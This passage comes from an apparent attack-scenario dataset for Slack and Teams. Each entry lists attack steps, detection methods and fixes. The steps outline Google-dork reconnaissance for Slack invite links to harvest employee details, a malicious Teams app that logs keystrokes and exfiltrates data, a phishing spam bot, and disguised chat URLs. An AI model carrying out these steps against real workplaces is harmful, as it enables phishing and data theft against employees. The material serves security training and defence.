Attack Steps: Step 1: Use Google dork: inurl:slack.com/join or site:slack.com invite.Step 2: Collect valid public invite links.Step 3: Join the workspace anonymously (if allowed).Step 4: View public channels and member directory (many allow non-restricted views).Step 5: Extract usernames, job titles, emails for social engineering.Step 6: Use data to craft spear phishing simulations.
Detection Method: Monitor new members from external IPs
Solution: Disable public invites, enforce approval process

Title: Malicious App in Teams App Store
Scenario Description: Attacker publishes a malicious app to the Teams app store mimicking productivity tool, injects tracking or payload URLs
Tools Used: MS App Studio, Azure AD, Web Tracking Tools
Attack Steps: Step 1: Develop a basic productivity web app (e.g., calendar or task manager).Step 2: Submit it to Teams Store with a clean frontend but malicious backend tracking (e.g., keystroke logs or exfil URLs).Step 3: Gain approval and share within organization.Step 4: Users install thinking it’s legitimate.Step 5: Use logs to track user sessions, exfiltrate behavior.Step 6: Show how the app silently harvests info for simulation.
Detection Method: Monitor app behavior, restrict 3rd-party installations
Solution: Enforce whitelisting, isolate 3rd-party apps

Title: Slack Channel Spamming Bot
Scenario Description: Attacker invites bot that floods Slack with spam/malware links, overwhelming users and mimicking DoS
Attack Steps: Step 1: Create a Slackbot using Slack API and SDK with chat:write and channels:read.Step 2: Generate spam messages with embedded phishing or malware links.Step 3: Deploy the bot to randomly post in every accessible channel every few seconds.Step 4: Use scheduling (e.g., cron) to automate spam bursts.Step 5: Simulate impact by measuring user distraction and alert fatigue.Step 6: Trigger detection via volume-based alerting.
Detection Method: Slackbot activity logs, volume-based detection
Solution: Rate limit bots, monitor bot behavior

Title: Teams URL Preview Phishing
Scenario Description: Attacker sends disguised URLs in Teams chats that appear trustworthy but redirect to phishing/malware sites
Tools Used: Bit.ly, Teams Chat, Fake Domain Generator
